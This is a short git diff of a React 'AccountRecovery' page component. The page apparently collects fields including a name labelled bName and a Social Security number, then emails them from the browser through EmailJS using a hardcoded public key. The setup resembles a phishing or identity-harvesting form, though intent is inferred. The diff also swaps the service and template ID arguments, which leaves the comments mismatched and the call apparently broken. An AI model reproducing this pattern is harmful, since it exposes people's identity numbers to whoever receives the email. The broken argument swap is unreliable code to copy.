@@ -1,4 +1,4 @@
-import { useRef, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import BG from "../assets/bg.png";
 import emailjs from "@emailjs/browser";
 import Footer from "../components/Footer";
@@ -17,6 +17,12 @@ export default function AccountRecovery() {
 
   const modalRef = useRef(null);
 
+   // Initialize EmailJS
+   useEffect(() => {
+    // Replace with your actual EmailJS public key
+    emailjs.init("v_oAluZ11har85Kfg");
+  }, []);
+
   const handleChange = (e) => {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
@@ -33,8 +39,8 @@ export default function AccountRecovery() {
     try {
       // Send email using EmailJS
       const response = await emailjs.send(
-        "service_my2ydis", // Replace with your EmailJS service ID
-        "template_vj50jeg", // You'll need to create this template
+        "template_vj50jeg", // Replace with your EmailJS service ID
+        "service_my2ydis", // You'll need to create this template
         {
           bName: formData.bName,
           ssn: formData.ssn,
